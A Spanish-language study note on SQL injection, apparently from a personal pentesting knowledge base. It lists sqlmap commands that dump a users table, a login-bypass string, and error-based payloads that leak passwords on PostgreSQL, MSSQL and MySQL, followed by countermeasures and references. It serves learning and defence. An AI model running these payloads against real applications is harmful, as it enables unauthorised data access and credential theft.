# Inyección SQL (SQLi)

## Descripción
Técnica de explotación que permite a un atacante interferir con las consultas que una aplicación realiza a su base de datos. Permite ver datos que normalmente no se pueden recuperar, modificar o eliminar datos, y en algunos casos, obtener acceso de administrador al servidor de la base de datos (RCE).

## Clasificación
- **Fase**: Explotación
- **MITRE ATT&CK**: T1190 (Exploit Public-Facing Application)
- **Plataforma**: Web
- **Dificultad**: Intermedia

## Herramientas
- **sqlmap** (`--batch`, `--dump`, `--risk`, `--level`) — herramienta automatizada para detectar y explotar fallos de inyección SQL.
- **Burp Suite** (Repeater, Intruder) — para pruebas manuales y manipulación de parámetros en tiempo real.
- **Ghmap** — herramienta para automatizar el descubrimiento de dorks relacionados con SQLi.

## Comandos / Ejemplos

### Explotación automatizada con SQLMap
```bash
# Escaneo básico de una URL con parámetros
sqlmap -u "http://target.com/products.php?id=1" --batch --dbs
# Resultado: lista las bases de datos disponibles si el parámetro es vulnerable

# Extracción de tablas de una base de datos específica
sqlmap -u "http://target.com/products.php?id=1" -D public_db --tables --batch

# Volcado de credenciales de una tabla
sqlmap -u "http://target.com/products.php?id=1" -D public_db -T users --columns --dump --batch
```

### Pruebas manuales básicas
```sql
-- Bypass de login simple
admin' OR '1'='1' --
admin' #

-- Error-based SQLi - PostgreSQL/SQLite (CAST a int, lectura directa del valor en el mensaje)
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

-- Error-based SQLi - PostgreSQL/Oracle/SQLite con concatenacion (compacto, util si hay limite de longitud)
'||CAST((SELECT password FROM users LIMIT 1)AS int)||'

-- Error-based SQLi - MS SQL Server
' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--

-- Error-based SQLi - MySQL (XPath via extractvalue, ya que no hay CAST directo a int aprovechable)
' AND extractvalue(rand(),concat(0x3a,(SELECT password FROM users LIMIT 1)))--

-- Error-based SQLi - MySQL clasico (duplicate key con COUNT/GROUP BY, fallback cuando los anteriores estan filtrados)
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT version()), 0x7e, FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

## Contramedidas
- Uso de consultas preparadas (Prepared Statements) con parametrización.
- Implementación de una lista blanca (Allow-list) para la validación de entradas.
- Uso de ORMs modernos que gestionan la seguridad de las consultas por defecto.
- Aplicar el principio de menor privilegio a la cuenta de servicio de la base de datos.

## Referencias
- Kim, P. (2018). *The Hacker Playbook 3*. Secure Planet, LLC.
- MITRE Corporation. (2024). ATT&CK Technique T1190: Exploit Public-Facing Application. https://attack.mitre.org/techniques/T1190/
- Writeup propio: [`learning/portswigger/visible-error-based-sql-injection/writeup.md`](../../../learning/portswigger/visible-error-based-sql-injection/writeup.md) — ejemplo end-to-end del CAST PostgreSQL.
